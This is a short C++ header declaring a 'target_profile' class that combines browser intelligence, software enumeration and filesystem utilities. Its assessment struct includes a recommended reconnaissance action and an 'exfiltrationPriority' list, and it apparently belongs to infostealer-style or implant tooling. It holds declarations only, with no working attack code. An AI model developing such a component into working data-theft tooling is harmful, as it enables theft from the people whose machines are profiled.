#include "includes.hpp"
#include "browser_intel.hpp"
#include "software_enum.hpp"
#include "filesystem_utils.hpp"

class target_profile
{
    public:
        struct TargetAssessment {
            std::string targetClassification = "UNKNOWN";
            std::vector<std::string> primaryThreats = {};
            std::string recommendedAction = "RECONNAISSANCE_ONLY";
            std::string securityPosture = "UNKNOWN";
            std::vector<std::string> exfiltrationPriority = {};
        };

        TargetAssessment analyzeTarget();

        void generateAssessment();

    private:
        browser_intel browserIntel;
        software_enum softwareEnum;
        fs_utils fsUtils;
};